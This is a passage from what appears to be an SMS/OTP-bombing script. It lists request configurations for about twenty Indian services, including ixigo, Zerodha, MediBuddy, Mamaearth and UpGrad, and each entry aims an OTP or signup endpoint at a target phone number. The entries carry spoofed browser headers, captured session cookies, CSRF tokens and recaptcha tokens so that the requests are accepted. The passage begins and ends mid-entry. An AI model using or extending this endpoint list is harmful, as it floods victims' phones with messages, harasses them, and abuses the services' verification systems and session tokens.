            "cookie": "__cf_bm=FdtmIxlX4PNfSpwYX1qvSdA99iOf9abzGUc7BSSoACw-1715442021-1.0.1.1-74e8P2QKatyvbBQjT7F7nqmbRS2wUmHIqJgmxxVi52EciJqdP_sqwydnwciOjrV8mWhS6v8d2XeMCAckwcbGzA; ixiUID=dc8e7b027263440b83a8; ixiSrc=3J4Sv1FzWiz+BBr0b5qy7LAESHlzQ1ym3JiFkuSC7S5GBZftf5jJ+0yO8gbj/stz5lWZnyT8gvEVf83M6I4pxA==; ixigoSrc=dc8e7b027263440b83a8|DIR:11052024|DIR:11052024|DIR:11052024; _gcl_au=1.1.78477619.1715442051; _ga=GA1.1.92728914.1715442053; _ym_uid=1715442054910529504; _ym_d=1715442054; _ym_isad=2; _ga_LJX9T6MDKX=GS1.1.1715442052.1.1.1715442087.25.0.1092021780; WZRK_G=dd46574995934bd09d3eef419c5501fe; WZRK_S_R5Z-849-WZ4Z=%7B%22p%22%3A1%2C%22s%22%3A1715442104%2C%22t%22%3A1715442223%7D",
            "deviceid": "dc8e7b027263440b83a8",
            "devicetime": "1715442205998",
            "gauth": "0.37EEF3ifZtJrSlsXYM3Jh31RMw1-QXORNR98Jtxx7eFsy48fe3rtoB6fTsPrhJKj9iIq25m-6BK30NAitgfSHcRQ8D9FSVzyFc4Rk4hNYn3Cj7EgBiIaPiIX1UyBrSdNM9p9WYpGH-ijc23okhxAZRhzx_BsPuyU3cPdgDjg1jAIAG_AOYxDZYSDjXBn7wDGv7sak0a4zCLwDef2PT5-pI0ecNnyLKEpNnFUg5O9955k_KjT8g0KuijkxQzMjQTMiqN917tCfcMDaZG1oYmcJjHU7eNxVwrsspE7YKEtrRXW58GAUJdhyFq95PmryvpLcDb3XxFwRw1R_YQgvCHyhPuaiw3WKrXR2Lq_XAgyz4eqv9gLGnSETFQ31dmAfPLcluZow_F7FwEJ_MNK5Q-m7YtO3UHRXMFogYOHtRixfHNu5uptz-tel8SXi414WDyX3VMftHjLgd7IUPaljlOASQ.3JCfm9KSGd3dfmd60LLg2A.fa41f75bb9ec89c96f7f89193863715eef60f7b71dc2d2846ce7de61449ecc4d",
            "ixisrc": "3J4Sv1FzWiz+BBr0b5qy7LAESHlzQ1ym3JiFkuSC7S5GBZftf5jJ+0yO8gbj/stz5lWZnyT8gvEVf83M6I4pxA",
            "origin": "https://www.ixigo.com",
            "priority": "u=1, i",
            "referer": "https://www.ixigo.com/?loginVisible=true",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "uuid": "dc8e7b027263440b83a8"
        },
        "data": lambda p, d: f"sixDigitOTP=true&token=1f94cd26e6ace46d55cb10f0f72d29a0c080a14bdfb366d3c549f5000ce0898e514f9bc240f1b66fbf3cb97b65b74665f991767172e62de48edd47e98421d270&resendOnCall=false&prefix=%2B91&resendOnWhatsapp=false&phone={p}"
    },
    
    {
        "name": "55Club",
        "url": lambda p, d: "https://api.55clubapi.com/api/webapi/SmsVerifyCode",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://55club08.in",
            "priority": "u=1, i",
            "referer": "https://55club08.in/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda p, d: json.dumps({"phone": f"91{p}", "codeType": 1, "language": 0, "random": "35ae48f136d74b279dbd0eeb2504e7f8", "signature": "78A2879A0D46B65D257F9B29354B5DBA", "timestamp": int(time.time())})
    },
    
    {
        "name": "Zerodha",
        "url": lambda p, d: "https://zerodha.com/account/registration.php",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json;charset=UTF-8",
            "cookie": "cf_bm=ElnS2p7cn77x_2mWXSAkw8p7DCwRqsLuicR2.A7Yix8-1715445990-1.0.1.1-3r3HzDpdeQsDlj4p6i8hpSHjARApUniHH5VucpQ.RZJ1h7A6HP4H_VTKNiG.el_XckzpYubXRY06y9nP4VedLw; _cfuvid=tQIXhAaSONoNxLn2WTlwUcLy7GvfHXcxlUX0eibyTJY-1715445990470-0.0.1.1-604800000; cf_clearance=9NQLvi9W7gmpLV24ZU7wOokjiHT81xYc1GjJ08iI0-1715446086-1.0.1.1-dUVk1GMFtkdmZ2GfVkAt5GlUzgagCLx_uiFWF1dEWb4oehts1tZSs8pCY7v8G2plkGi1d7FauCePud424H6tMw",
            "origin": "https://zerodha.com",
            "priority": "u=1, i",
            "referer": "https://zerodha.com/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-arch": '"x86"',
            "sec-ch-ua-bitness": '"64"',
            "sec-ch-ua-full-version": '"124.0.6367.202"',
            "sec-ch-ua-full-version-list": '"Chromium";v="124.0.6367.202", "Google Chrome";v="124.0.6367.202", "Not-A.Brand";v="99.0.0.0"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-model": '""',
            "sec-ch-ua-platform": '"Windows"',
            "sec-ch-ua-platform-version": '"10.0.0"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda p, d: json.dumps({"mobile": p, "source": "zerodha", "partner_id": ""})
    },
    
    {
        "name": "Aakash",
        "url": lambda p, d: "https://antheapi.aakash.ac.in/api/generate-lead-otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "cache-control": "max-age=0",
            "content-type": "application/json",
            "origin": "https://www.aakash.ac.in",
            "priority": "u=1, i",
            "referer": "https://www.aakash.ac.in/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "x-client-id": "a6fbf1d2-27c3-46e1-b149-0380e506b763"
        },
        "data": lambda p, d: json.dumps({"mobile_psid": p, "mobile_number": "", "activity_type": "aakash-myadmission", "webengageData": {"profile": "student", "whatsapp_opt_in": True, "method": "mobile"}})
    },
    
    {
        "name": "Testbook",
        "url": lambda p, d: f"https://api.testbook.com/api/v2/mobile/signup?mobile={p}&clientId=1117490662.1715447223&sessionId={int(time.time())}",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://testbook.com",
            "priority": "u=1, i",
            "referer": "https://testbook.com/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "x-tb-client": "web,1.2"
        },
        "data": lambda p, d: json.dumps({"firstVisitSource": {"type": "organic", "utm_source": "google", "utm_medium": "organic", "timestamp": "2024-05-11T17:06:43.000Z", "entrance": "https://testbook.com/", "referralUrl": "https://www.google.com/"}, "signupSource": {"type": "organic", "utm_source": "google", "utm_medium": "organic", "timestamp": "2024-05-11T17:06:43.000Z", "entrance": "https://testbook.com/", "referralUrl": "https://www.google.com/"}, "mobile": p, "signupDetails": {"page": "HomePage", "pagePath": "/", "pageType": "HomePage"}})
    },
    
    {
        "name": "MediBuddy",
        "url": lambda p, d: "https://loginprod.medibuddy.in/unified-login/user/register",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.medibuddy.in",
            "priority": "u=1, i",
            "referer": "https://www.medibuddy.in/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda p, d: json.dumps({"source": "medibuddyInWeb", "platform": "medibuddy", "phonenumber": p, "flow": "Retail-Login-Home-Flow", "idealLoginFlow": False, "advertiserId": "3893d117-b321-Lba9-815e-db63c64b112a", "mbUserId": None})
    },
    
    {
        "name": "Beyoung",
        "url": lambda p, d: "https://www.beyoung.in/api/sendOtp.json",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "access-token": "JQ0fUq6r6dhzJHRLSdn3J6kyzNXumrEM9gy+q8456XEsQISIKfb31Wiyx/VhM84NYcBLGRVjXeU4GqYWDAJpwQ==",
            "cache-control": "no-cache",
            "content-type": "application/json;charset=UTF-8",
            "cookie": "_gcl_au=1.1.440185340.1715511785; _ga=GA1.1.1075884316.1715511787; _ga_7YP4PPR9HS=GS1.1.1715511786.1.1.1715511788.58.0.0; user_id_t=15c6486a-e8ea-4a7e-8551-2069ec30fe70; _fbp=fb.1.1715511794344.1331412975",
            "expires": "0",
            "origin": "https://www.beyoung.in",
            "pragma": "no-cache",
            "priority": "u=1, i",
            "referer": "https://www.beyoung.in/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "visitor": "477701202435772"
        },
        "data": lambda p, d: json.dumps({"username": p, "username_type": "mobile", "service_type": 0, "vid": "477701202435772"})
    },
    
    {
        "name": "Wrogn",
        "url": lambda p, d: "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "action": "sendOTP",
            "content-type": "application/json",
            "origin": "https://wrogn.com",
            "priority": "u=1, i",
            "referer": "https://wrogn.com/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "shop_name": "wrogn-website.myshopify.com",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda p, d: json.dumps({"username": f"+91{p}", "type": "mobile", "domain": "wrogn.com", "recaptcha_token": ""})
    },
    
    {
        "name": "Medkart",
        "url": lambda p, d: f"https://app.medkart.in/api/v1/auth/requestOTP?uuid=f9e75a95-e172-4922-b69c-08e1e3be9f1b",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "app-platform": "web",
            "authorization": "Bearer",
            "content-type": "application/json",
            "device_id": "6641194520998",
            "langcode": "en",
            "origin": "https://www.medkart.in",
            "priority": "u=1, i",
            "referer": "https://www.medkart.in/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda p, d: json.dumps({"mobile_no": p})
    },
    
    {
        "name": "Mamaearth",
        "url": lambda p, d: "https://auth.mamaearth.in/v1/auth/initiate-signup",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json;charset=UTF-8",
            "isweb": "true",
            "origin": "https://mamaearth.in",
            "priority": "u=1, i",
            "referer": "https://mamaearth.in/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda p, d: json.dumps({"mobile": p, "referralCode": ""})
    },
    
    {
        "name": "Coverfox",
        "url": lambda p, d: "https://www.coverfox.com/otp/send/",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded",
            "cookie": "vt_home_visited=Yes; IS_YAHOO_NATIVE=False; landing_page_url=\"https://www.coverfox.com/\"; tracker=6f8b6312ab8e3039ed01a0c5dae0fd73; sessionid=xtymjyfi87nat0xp09g1qx0xrms9cu9l; _ga_M60LBYV2SK=GS1.1.1715591814.1.0.1715591814.0.0.0; _gid=GA1.2.190999011.1715591815; _gat_gtag_UA_236899531_1=1; _dc_gtm_UA-45524191-1=1; _ga=GA1.1.1812460515.1715591815; _ga_L1DCK356RJ=GS1.1.1715591815.1.0.1715591815.0.0.0; AWSALB=6d3J4OZjP7N26858oPfNJvxuA5e3ePcOVmaoC9PO/iRqTj3NW3qhAozavPMDSCULtHgwKjUjMmxQgqjFpUsHnDB9PYDrC8DP9V+EfrFfNsLKVTndTrLIZpCou0zd; _uetsid=8c899110110911efbeba7dac0ce54265; _uetvid=8c8aa560110911ef9e9c35a1a2c7d25c; _fbp=fb.1.1715591818489.212380246",
            "origin": "https://www.coverfox.com",
            "priority": "u=1, i",
            "referer": "https://www.coverfox.com/user-login/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        },
        "data": lambda p, d: f"csrfmiddlewaretoken=5YvA2IoBS6KRJrzV93ysh0VRRvT7CagG3DO7TPu5TwZ9161xVWsEsHzL6mYfvnIA&contact={p}"
    },
    
    {
        "name": "WoodenStreet",
        "url": lambda p, d: "https://www.woodenstreet.com/index.php?route=account/forgotten_popup",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "cookie": "PHPSESSID=g2toohfnh12nevqm9ugvai7vb2; utm_campaign_id=1406; source=Google; skip_mobile=true; _gcl_aw=GCL.1715593865.EAIaIQobChMIs-WXkq2KhgMVeaRmAh3JQgNHEAAYASAAEgKOVPD_BwE; _gcl_au=1.1.645456708.1715593865; _gid=GA1.2.2020750747.1715593866; _gac_UA-62640150-1=1.1715593866.EAIaIQobChMIs-WXkq2KhgMVeaRmAh3JQgNHEAAYASAAEgKOVPD_BwE; _uetsid=515109b0110e11ef924e1f3875a02587; _uetvid=515ae710110e11ef8666217de75f3cf9; _ga=GA1.1.358917175.1715593866; _fbp=fb.1.1715593868299.1718531847; login_modal_shown=yes; G_ENABLED_IDPS=google; _ga_WYJWZGFQ0J=GS1.1.1715593867.1.0.1715593882.45.0.0; modal_shown=yes",
            "origin": "https://www.woodenstreet.com",
            "priority": "u=1, i",
            "referer": "https://www.woodenstreet.com/?utm_source=Google&utm_medium=cpc&utm_campaign=14220867988&cid=EAIaIQobChMIs-WXkq2KhgMVeaRmAh3JQgNHEAAYASAAEgKOVPD_BwE&pl=&kw=wooden%20street&utm_adgroup=125331114403&gad_source=1&gclid=EAIaIQobChMIs-WXkq2KhgMVeaRmAh3JQgNHEAAYASAAEgKOVPD_BwE",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "token": "",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        },
        "data": lambda p, d: f"token=&firstname=Aartd&telephone={p}&pincode=110086&city=NORTH+WEST+DELHI&state=DELHI&cxid=NTUxOTE0&email=user%40gmail.com&password=%40Abvd1234&pagesource=onload&redirect2=&login=2&userput_otp="
    },
    
    {
        "name": "GoMechanic",
        "url": lambda p, d: "https://gomechanic.app/api/v2/send_otp",
        "method": "POST",
        "headers": {
            "Accept": "*/*",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Authorization": "725ea1b774c3558a8ec01a8405334a6e50e1e822d9549d84b36a1d3bb9478a27",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Origin": "https://gomechanic.in",
            "Referer": "https://gomechanic.in/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "cross-site",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda p, d: json.dumps({"number": p, "source": "website", "random_id": "K6z9b"})
    },
    
    {
        "name": "LoveLocal",
        "url": lambda p, d: "https://homedeliverybackend.mpaani.com/auth/send-otp",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en",
            "client-code": "vulpix",
            "content-type": "application/json",
            "origin": "https://www.lovelocal.in",
            "priority": "u=1, i",
            "referer": "https://www.lovelocal.in/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A/Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda p, d: json.dumps({"phone_number": p, "role": "CUSTOMER"})
    },
    
    {
        "name": "Tyreplex",
        "url": lambda p, d: "https://www.tyreplex.com/includes/ajax/gfend.php",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Cookie": "PHPSESSID=t2p0nhdq0lr9urakmratq4nd1o; _gcl_au=1.1.1418022926.1715621870; _gid=GA1.2.1238691204.1715621871; _gat_UA-144475494-1=1; gads=ID=f63744b23745a70c:T=1715621871:RT=1715621871:S=ALNI_MZBf13VT4bNVBfKOHbiZhJ3r9u5yA; gpi=UID=00000e1a8fc4f354:T=1715621871:RT=1715621871:S=ALNI_MYs8bPQMcoLAM5g-TX_h9lYl29HMA; __eoi=ID=8128f50e3278b1a5:T=1715621871:RT=1715621871:S=AA-AfjYrJcEbaBWGnMYqCRZith_o; dyn_cookie=true; v_type_id=3; _ga=GA1.2.110565510.1715621871; utm_source=Direct; firstUTMParamter=Direct#null#null; lastUTMParamter=Direct#null#null; landing_url=https://www.tyreplex.com/login; la_abbr=LOGIN; la_abbr_d=Login Page; la_c=login; la_default_city_id=1630; la_default_pincode=110001; la_default_pincode_display=110001, New Delhi; la_load_more_after_records=8; la_ajax_load_more_records=8; la_match_v_variants=; pv_abbr=LOGIN; pv_abbr_d=Login Page; pv_c=login; pv_default_city_id=1630; pv_default_pincode=110001; pv_default_pincode_display=110001, New Delhi; pv_load_more_after_records=8; pv_ajax_load_more_records=8; pv_match_v_variants=; _fbp=fb.1.1715621882325.2109963301; _ga_K6EJPW0E8D=GS1.1.1715621871.1.1.1715621890.41.0.0; city_id=1630; default_city_id=1630; pincode=110086; manual_city_selected=1",
            "Origin": "https://www.tyreplex.com",
            "Referer": "https://www.tyreplex.com/login",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda p, d: f"perform_action=sendOTP&mobile_no={p}&action_type=order_login"
    },
    
    {
        "name": "Moglix",
        "url": lambda p, d: "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "access-control-allow-methods": "GET, POST, PUT, DELETE",
            "content-type": "application/json",
            "cookie": "AMCVS_1CEE09F45D761AFF0A495E2D%40AdobeOrg=1; AMCV_1CEE09F45D761AFF0A495E2D%40AdobeOrg=179643557%7CMCIDTS%7C19865%7CMCMID%7C58822726746254564151447357050729602323%7CMCAAMLH-1716898290%7C12%7CMCAAMB-1716898290%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1716300690s%7CNONE%7CvVersion%7C5.5.0; s_cc=true; user_sid=s%3ATQ0qv4hLT153wuEftXkOFpeoaD4f3RcC.Pf2awi603%2BgCd0vFyqddzywhbtBrgq77GVj9pyt7DLA; _gcl_aw=GCL.1716293504.EAIaIQobChMIqN7yuduehgMVXCSDAx3VPw8_EAAYASAAEgLhQPD_BwE; AMP_TOKEN=%24NOT_FOUND; _gid=GA1.2.1283593062.1716293508; _gat_UA-65947081-1=1; _ga_V1GYNRLK0T=GS1.1.1716293509.1.0.1716293509.60.0.0; _fbp=fb.1.1716293510686.1114094958; _ga=GA1.2.1383706961.1716293508; _gac_UA-65947081-1=1.1716293517.EAIaIQobChMIqN7yuduehgMVXCSDAx3VPw8_EAAYASAAEgLhQPD_BwE; _gcl_au=1.1.1857621863.1716293504.492344148.1716293509.1716293517; gpv_V9=moglix%3Asignup%20form; s_nr=1716293519104-New; s_sq=%5B%5BB%5D%5D",
            "origin": "https://www.moglix.com",
            "priority": "u=1, i",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda p, d: json.dumps({"email": "", "phone": p, "type": "p", "source": "signup", "buildVersion": "DESKTOP-7.3", "device": "desktop"})
    },
    
    {
        "name": "OxygenDigital",
        "url": lambda p, d: "https://oxygendigitalshop.com/graphql",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "cookie": "PHPSESSID=kpqtnpvmdp4k43tcgdopos8e88; _gcl_au=1.1.309357057.1716293827; _clck=1gmll5w%7C2%7Cfly%7C0%7C1602; _ga=GA1.2.1318673831.1716293828; _gid=GA1.2.1588528699.1716293829; _gat_UA-179241331-1=1; _fbp=fb.1.1716293829956.1718674954; private_content_version=09b3c0c64a967be3c44ffa5b45edc234; _ga_M4N3E3FN0Z=GS1.1.1716293827.1.1.1716293856.31.0.0; _clsk=c5rolk%7C1716293857454%7C4%7C1%7Ci.clarity.ms%2Fcollect",
            "origin": "https://oxygendigitalshop.com",
            "priority": "u=1, i",
            "referer": "https://oxygendigitalshop.com/my-account",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda p, d: json.dumps({"operationName": "sendRegistrationOtp", "variables": {"email_or_otp": f"+91{p}", "isResend": False, "token": "03AFcWeA47pl14PFJtz3PaIyTLlRVG0gBdqirpf5kuLCM3Ue63bo30D5xtt3OngezeoBlB3kVH6x8AtyIRK-K6_WOXHx4W4bGNY4803bh8kpzibb2hUbjPTE780Kr1Gh7fVuZvTtsS-osUhhLAWsc3H8Fp3JFnFQi3u4gtZ_ARIQtzAUWp9p8Qt4nDsrM2fwtX9uC0SYz78n1EEXoIstjuEedvgPGsC7xqnwWBwySpW2tAGvVYIQzk6uloXuCUM9CLogsdYPt5_8G437Em9CO-I1SmQCyniCF0UDzfYGUl8pzIBSbWLzZdj4DvFkVHOHytFd6UvjqjTyuoT2RQI-KKXI9wJDGXwtbQOakjRLKE-SymDCD0k6GPQvjNJcbqhk-NMVckwSHLP3muLKQRI9EBKB4t3IjTCHoVyPMF0eLg4J5raYeukU0b0rwoOCoDs7_5uyLCc8qzIBh6LHywWirQJ-m1HvNyfsOvBX-d8_bWT7MIPKFflQfd_DnZKDyrFrRRMVQKiXeSVIRhEAZDIJul5f7Ns-t5isfYOU8-dcANSC1VJeMSPZBkXtKKvSXXYM9vtc7V59nhPyv7LU5v_wpZ2KwOHj7dybDeVr2ELZARDI1tc_NMxZy9HMrLuGhscKa1kSy29v0tpBqtU-l7vIB-1qLT-G3kxHJE4fdv9TL973FPzbEpz03wusN5YomS0hv31VhRPr-qDHBzmj-O1gyPxlEhPkNSPuiPwg"}, "query": "mutation sendRegistrationOtp($token: String!, $email_or_otp: String!, $isResend: Boolean!) {\n  sendRegistrationOtp(token: $token, value: $email_or_otp, is_resend: $isResend)\n}\n"})
    },
    
    {
        "name": "UpGrad",
        "url": lambda p, d: "https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "client": "web",
            "content-type": "application/json",
            "course": "general-interest",
            "origin": "https://www.upgrad.com",
            "priority": "u=1, i",
            "referer": "https://www.upgrad.com/",
            "referrer": "https://www.google.com/",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "utm_campaign": "IND_ACQ_WEB_Google_BSearch_All_All_All_Brand_ROI",
            "utm_content": "Brand_Longtail",
            "utm_medium": "BSearch",
            "utm_source": "Google",
            "utm_term": "upgrad online education"
        },
        "data": lambda p, d: json.dumps({"phoneNumber": f"+91{p}"})
    },
    
    {
        "name": "PinkNBlu",
